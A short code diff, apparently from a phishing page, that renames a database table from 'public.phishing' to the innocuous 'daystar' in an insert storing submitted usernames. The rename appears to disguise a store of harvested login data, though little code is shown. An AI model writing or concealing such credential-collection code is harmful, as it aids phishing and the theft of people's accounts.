@@ -44,7 +44,7 @@ document
 
         const { data, error } =
         await client
-        .from("public.phishing")
+        .from("daystar")
         .insert([
             {
                 username: username,
